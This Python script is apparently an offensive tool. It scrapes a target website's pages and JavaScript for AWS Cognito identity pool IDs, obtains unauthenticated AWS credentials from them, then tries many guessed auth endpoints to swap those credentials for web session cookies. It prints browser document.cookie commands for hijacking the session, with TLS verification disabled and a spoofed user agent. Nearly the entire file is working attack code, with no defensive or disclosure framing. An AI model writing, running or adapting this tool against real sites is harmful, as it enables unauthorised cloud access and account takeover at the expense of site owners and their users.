#!/usr/bin/env python3

import requests
import json
import xml.etree.ElementTree as ET
from datetime import datetime, timezone, timedelta
import re
from urllib.parse import urlparse, urljoin
import logging
from bs4 import BeautifulSoup
import boto3
import uuid
import argparse
import sys
import jwt
import base64
import urllib3
urllib3.disable_warnings()

class WebSessionConverter:
    def __init__(self, base_url, credentials, identity_id):
        self.base_url = base_url
        self.credentials = credentials
        self.identity_id = identity_id
        self.session = requests.Session()
        self.logger = logging.getLogger('WebSessionConverter')

    def convert_to_web_session(self):
        """Try all known methods to convert AWS credentials to web session"""
        results = {}
        
        # 1. Try Direct AWS Credentials Exchange
        auth_payloads = [
            {
                "IdentityId": self.identity_id,
                "Credentials": {
                    "AccessKeyId": self.credentials.get('AccessKeyId'),
                    "SecretKey": self.credentials.get('SecretKey'),
                    "SessionToken": self.credentials.get('SessionToken')
                }
            },
            {
                "aws_access_key_id": self.credentials.get('AccessKeyId'),
                "aws_secret_access_key": self.credentials.get('SecretKey'),
                "aws_session_token": self.credentials.get('SessionToken')
            },
            {
                "token": self.credentials.get('SessionToken'),
                "identityId": self.identity_id,
                "provider": "cognito-identity"
            }
        ]

        # Common + Capella-specific endpoints based on research
        auth_endpoints = [
            '/api/auth/aws',
            '/api/auth/session',
            '/api/v1/auth',
            '/api/v1/auth/session',
            '/api/v1/auth/aws',
            '/auth/session',
            '/auth/aws-credentials',
            '/auth/token-exchange',
            '/session/token',
            '/api/session',
            '/authenticate',
            '/auth/signin',
            '/auth/cognito/token',
            '/v1/auth/cognito'
        ]

        headers = {
            'Content-Type': 'application/json',
            'X-Amz-Security-Token': self.credentials.get('SessionToken'),
            'X-Amz-Access-Key-Id': self.credentials.get('AccessKeyId'),
            'Authorization': f'AWS4-HMAC-SHA256 Credential={self.credentials.get("AccessKeyId")}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
        }

        for endpoint in auth_endpoints:
            for payload in auth_payloads:
                try:
                    url = urljoin(self.base_url, endpoint)
                    response = requests.post(
                        url,
                        json=payload,
                        headers=headers,
                        verify=False,
                        allow_redirects=True
                    )
                    self.logger.debug(f"Trying {endpoint} - Status: {response.status_code}")
                    
                    if response.status_code in [200, 302]:
                        results['direct_exchange'] = {
                            'endpoint': endpoint,
                            'cookies': dict(response.cookies),
                            'headers': dict(response.headers),
                            'response': response.text[:200]
                        }
                        return results

                except Exception as e:
                    self.logger.debug(f"Failed endpoint {endpoint}: {str(e)}")

        # 2. Try OAuth/OIDC Flow
        try:
            oauth_endpoints = [
                '/.well-known/openid-configuration',
                '/oauth2/authorize',
                '/oauth2/token'
            ]

            for endpoint in oauth_endpoints:
                url = urljoin(self.base_url, endpoint)
                params = {
                    'identity_id': self.identity_id,
                    'access_token': self.credentials.get('SessionToken'),
                    'response_type': 'token',
                    'client_id': 'aws-cognito'
                }
                
                response = requests.get(url, params=params, verify=False)
                if response.status_code in [200, 302]:
                    results['oauth'] = {
                        'endpoint': endpoint,
                        'location': response.headers.get('Location'),
                        'cookies': dict(response.cookies)
                    }
                    return results

        except Exception as e:
            self.logger.debug(f"OAuth flow failed: {str(e)}")

        # 3. Try AWS STS Token Exchange
        try:
            sts_client = boto3.client('sts',
                aws_access_key_id=self.credentials.get('AccessKeyId'),
                aws_secret_access_key=self.credentials.get('SecretKey'),
                aws_session_token=self.credentials.get('SessionToken')
            )
            
            assumed_role = sts_client.get_caller_identity()
            
            # Try web exchange with role info
            auth_url = urljoin(self.base_url, '/api/auth/sts')
            response = requests.post(auth_url, 
                json={'caller_identity': assumed_role},
                headers=headers,
                verify=False
            )
            
            if response.status_code == 200:
                results['sts_exchange'] = {
                    'cookies': dict(response.cookies),
                    'headers': dict(response.headers)
                }
                return results

        except Exception as e:
            self.logger.debug(f"STS exchange failed: {str(e)}")

        # 4. Try Custom Token Exchange
        try:
            custom_headers = {
                'X-Identity-Id': self.identity_id,
                'X-Cognito-Token': self.credentials.get('SessionToken'),
                'X-AWS-Token': self.credentials.get('SessionToken')
            }
            
            auth_url = urljoin(self.base_url, '/api/auth')
            response = requests.post(auth_url, headers={**headers, **custom_headers}, verify=False)
            
            if response.status_code == 200:
                results['custom_exchange'] = {
                    'cookies': dict(response.cookies),
                    'headers': dict(response.headers)
                }
                return results

        except Exception as e:
            self.logger.debug(f"Custom exchange failed: {str(e)}")

        return None

class AWSCognitoAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.logger = logging.getLogger('AWSCognitoAnalyzer')
        self.visited_urls = set()
        self.tokens = set()
        self.oauth_configs = {}

    def analyze_url(self, target_url):
        """Analyze a target URL for AWS Cognito configurations"""
        self.logger.info(f"Starting comprehensive analysis of: {target_url}")
        
        try:
            parsed_url = urlparse(target_url)
            if not parsed_url.scheme:
                target_url = f"https://{target_url}"
                
            base_url = target_url.rstrip('/')
            all_findings = {}
            
            # First check base URL
            base_findings = self._analyze_single_url(base_url)
            if base_findings:
                all_findings[base_url] = base_findings
                
            # Then check for JavaScript files
            js_findings = self._analyze_js_references(base_url)
            if js_findings:
                all_findings[f"{base_url}_js"] = js_findings
                
            return all_findings if all_findings else None
            
        except Exception as e:
            self.logger.error(f"Error analyzing URL: {str(e)}")
            return None

    def _analyze_single_url(self, url):
        """Analyze a single URL for AWS configurations"""
        if url in self.visited_urls:
            return None
            
        self.visited_urls.add(url)
        self.logger.debug(f"Analyzing URL: {url}")
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            response = self.session.get(url, headers=headers, verify=False, timeout=10)
            self.logger.debug(f"Response status: {response.status_code}")
            
            findings = self._extract_aws_configs(response.text)
            if findings:
                self.logger.info(f"Found AWS configurations in {url}")
                return findings
                
        except Exception as e:
            self.logger.error(f"Error analyzing {url}: {str(e)}")
            
        return None

    def _analyze_js_references(self, url):
        """Analyze JavaScript files referenced in the page"""
        try:
            response = self.session.get(url, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            findings = {}
            for script in soup.find_all('script', src=True):
                js_url = urljoin(url, script['src'])
                if js_url not in self.visited_urls:
                    self.logger.debug(f"Analyzing JS file: {js_url}")
                    js_findings = self._analyze_single_url(js_url)
                    if js_findings:
                        findings[js_url] = js_findings
            
            return findings if findings else None
            
        except Exception as e:
            self.logger.error(f"Error analyzing JS files: {str(e)}")
            return None

    def _extract_aws_configs(self, content):
        """Extract AWS configurations from content"""
        if not content:
            return None
            
        patterns = {
            'identity_pool_id': r'(?:aws_cognito_identity_pool_id|identityPoolId|cognitoIdentityPoolId)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'user_pool_id': r'(?:userPoolId|aws_user_pools_id)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'client_id': r'(?:userPoolWebClientId|client-id|clientId)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'region': r'(?:aws_cognito_region|region)["\']?\s*(?::|=)\s*["\']([^"\']+)',
            'rum_role': r'(?:RoleArn=|roleArn"|roleArn=|role-arn)["\']?([^"\'&]+)'
        }
        
        results = {}
        for key, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                results[key] = matches[0]
                self.logger.debug(f"Found {key}: {matches[0]}")
                
        return results if results else None

class AWSIdentityValidator:
    def __init__(self, base_url):
        self.session = requests.Session()
        self.logger = logging.getLogger('AWSIdentityValidator')
        self.base_url = base_url

    def validate_identity_pool(self, identity_pool_id, region=None):
        """Attempt to get identity credentials"""
        try:
            # Try to extract region from pool ID if not provided
            if not region and ':' in identity_pool_id:
                region = identity_pool_id.split(':')[0]
                self.logger.debug(f"Extracted region from pool ID: {region}")

            regions_to_try = [region] if region else ['us-west-2', 'us-east-1', 'us-east-2', 'eu-west-1']
            
            for try_region in regions_to_try:
                try:
                    client = boto3.client('cognito-identity', region_name=try_region)
                    identity_response = client.get_id(
                        IdentityPoolId=identity_pool_id,
                        Logins={}  # Try unauthenticated access first
                    )
                    
                    if 'IdentityId' in identity_response:
                        self.logger.info(f"Successfully obtained Identity ID")
                        return identity_response
                        
                except Exception as e:
                    self.logger.debug(f"Failed in region {try_region}: {str(e)}")
                    continue
                    
        except Exception as e:
            self.logger.error(f"Error validating identity pool: {str(e)}")
            
        return None

    def get_credentials_for_identity(self, identity_id, region='us-west-2'):
        """Get AWS credentials for identity"""
        try:
            client = boto3.client('cognito-identity', region_name=region)
            creds_response = client.get_credentials_for_identity(
                IdentityId=identity_id
            )
            
            if 'Credentials' in creds_response:
                return creds_response['Credentials']
            
        except Exception as e:
            self.logger.error(f"Error getting credentials: {str(e)}")
        return None

def process_aws_configs(configs, analyzer):
    """Process discovered AWS configurations"""
    if not configs:
        return None
        
    # Find the base URL from configs
    base_url = None
    for url in configs.keys():
        if url.startswith('http'):
            base_url = url
            break
            
    if not base_url:
        return None
        
    validator = AWSIdentityValidator(base_url)
    results = {
        "identity_pools": [],
        "validations": [],
        "web_sessions": []
    }
    
    # Extract unique identity pools
    for url_data in configs.values():
        if isinstance(url_data, dict):
            for config in url_data.values():
                if isinstance(config, dict):
                    if 'identity_pool_id' in config:
                        pool_id = config['identity_pool_id']
                        if pool_id not in results['identity_pools']:
                            results['identity_pools'].append(pool_id)
    
    # Validate each identity pool
    for pool_id in results['identity_pools']:
        print(f"\nValidating Identity Pool: {pool_id}")
        validation_result = validator.validate_identity_pool(pool_id)
        
        if validation_result and 'IdentityId' in validation_result:
            identity_id = validation_result['IdentityId']
            print(f"Got Identity ID: {identity_id}")
            
            # Get AWS credentials
            credentials = validator.get_credentials_for_identity(identity_id)
            if credentials:
                print("Successfully obtained AWS credentials")
                
                # Try web session conversion
                print("\nAttempting web session conversion...")
                converter = WebSessionConverter(base_url, credentials, identity_id)
                web_session = converter.convert_to_web_session()
                
                if web_session:
                    print("Successfully converted to web session!")
                    print("\nTo use this session in your browser:")
                    if 'direct_exchange' in web_session:
                        for cookie_name, cookie_value in web_session['direct_exchange']['cookies'].items():
                            print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
                    
                    results['web_sessions'].append({
                        'identity_pool_id': pool_id,
                        'identity_id': identity_id,
                        'session': web_session
                    })
                else:
                    print("Failed to convert to web session")
                
                results['validations'].append({
                    'type': 'identity_pool',
                    'id': pool_id,
                    'identity_id': identity_id,
                    'credentials': credentials
                })
            else:
                print("Failed to get AWS credentials")
    
    return results

def main():
    parser = argparse.ArgumentParser(description="AWS Cognito Analyzer with Web Session Converter")
    parser.add_argument('-u', '--url', help="Target URL to analyze")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")
    parser.add_argument('-o', '--output', help="Output file for results")
    parser.add_argument('--insecure', action='store_true', help="Skip SSL verification")
    parser.add_argument('--creds', help="Use existing AWS credentials (AccessKey:SecretKey:SessionToken)")
    parser.add_argument('--identity', help="Use existing Identity ID")
    args = parser.parse_args()

    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    if not args.url:
        parser.print_help()
        sys.exit(1)

    results = {}

    # If credentials are provided directly
    if args.creds and args.identity:
        access_key, secret_key, session_token = args.creds.split(':')
        credentials = {
            'AccessKeyId': access_key,
            'SecretKey': secret_key,
            'SessionToken': session_token
        }
        converter = WebSessionConverter(args.url, credentials, args.identity)
        web_session = converter.convert_to_web_session()
        
        if web_session:
            print("\nSuccessfully converted existing credentials to web session!")
            print(json.dumps(web_session, indent=2, default=str))
            
            if 'direct_exchange' in web_session:
                print("\nTo use this session in your browser:")
                for cookie_name, cookie_value in web_session['direct_exchange']['cookies'].items():
                    print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(web_session, f, indent=2, default=str)
                print(f"\nResults saved to {args.output}")
            sys.exit(0)

    # Otherwise perform full analysis
    analyzer = AWSCognitoAnalyzer()
    configs = analyzer.analyze_url(args.url)
    
    if configs:
        print("\nDiscovered AWS configurations:")
        print(json.dumps(configs, indent=2))
        
        print("\nAttempting to validate configurations and obtain web sessions...")
        results = process_aws_configs(configs, analyzer)
        
        if results:
            print("\nValidation Results:")
            print(json.dumps(results, indent=2, default=str))
            
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(results, f, indent=2, default=str)
                print(f"\nResults saved to {args.output}")
            
            # Print any usable web sessions
            if results.get('web_sessions'):
                print("\nUsable Web Sessions Found!")
                for session in results['web_sessions']:
                    print(f"\nIdentity Pool: {session['identity_pool_id']}")
                    if 'direct_exchange' in session.get('session', {}):
                        print("Browser Cookie Commands:")
                        for cookie_name, cookie_value in session['session']['direct_exchange']['cookies'].items():
                            print(f"document.cookie = '{cookie_name}={cookie_value}; path=/;'")
        else:
            print("No successful validations")
    else:
        print("No AWS configurations found.")

if __name__ == "__main__":
    main()
